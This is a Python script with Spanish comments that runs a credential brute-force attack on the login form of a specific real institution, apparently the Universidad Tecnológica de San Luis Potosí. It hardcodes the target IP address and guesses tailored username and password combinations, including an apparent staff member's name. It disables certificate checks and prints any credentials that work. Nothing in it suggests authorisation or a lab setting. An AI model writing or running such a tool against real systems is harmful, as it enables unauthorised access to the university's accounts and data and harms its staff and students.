import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class UTSLPBruteForcer:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def generate_utslp_credentials(self):
        """Genera credenciales basadas en el dominio utslp.edu.mx"""
        print("[*] Generando credenciales UTSLP...")
        
        # Patrones comunes en instituciones educativas
        common_usernames = [
            "hnieto", "admin", "administrador", "root", "webmaster",
            "sistema", "sistemas", "informatica", "ti", "desarrollo",
            "rector", "director", "coordinador", "jefe", "supervisor"
        ]
        
        common_passwords = [
            "utslp", "Utslp", "UTSLP", "utslp2024", "Utslp2024",
            "utslp123", "Utslp123", "utslp.edu.mx", "hnieto",
            "Hnieto", "nieto", "Nieto", "password", "123456",
            "utslp2023", "utslp2022", "SITO", "sito", "MISITIO", "misitio"
        ]
        
        # Combinar usuario@dominio
        credentials = []
        for user in common_usernames:
            credentials.append((user, user))  # usuario como contraseña
            credentials.append((user, "utslp"))
            credentials.append((user, "Utslp123"))
            credentials.append((f"{user}@utslp.edu.mx", user))
            credentials.append((f"{user}@utslp.edu.mx", "utslp"))
        
        return credentials

    def brute_force_utslp(self):
        """Fuerza bruta específica para UTSLP"""
        print("[*] Iniciando fuerza bruta UTSLP...")
        
        credentials = self.generate_utslp_credentials()
        
        for username, password in credentials:
            try:
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': username,
                    'xContrasena': password
                }
                
                response = self.session.post(self.base_url, data=form_data, timeout=5)
                
                # Indicadores de éxito
                success_indicators = [
                    'Bienvenido', 'Welcome', 'Dashboard', 'Menú principal',
                    'Cerrar sesión', 'logout', 'Administración'
                ]
                
                if any(indicator in response.text for indicator in success_indicators):
                    print(f"[!] ¡CREDENCIALES VÁLIDAS ENCONTRADAS!")
                    print(f"    Usuario: {username}")
                    print(f"    Contraseña: {password}")
                    return username, password
                
                # Si la respuesta es diferente al mensaje normal
                if "Solicita Ficha de Admisión" not in response.text:
                    print(f"[+] Respuesta diferente con: {username}:{password}")
                    
            except Exception as e:
                print(f"[-] Error con {username}: {e}")
        
        print("[-] No se encontraron credenciales válidas")

# Ejecutar fuerza bruta UTSLP
print("=== FUERZA BRUTA UTSLP ===")
utslp_brute = UTSLPBruteForcer("189.254.143.102")
utslp_brute.brute_force_utslp()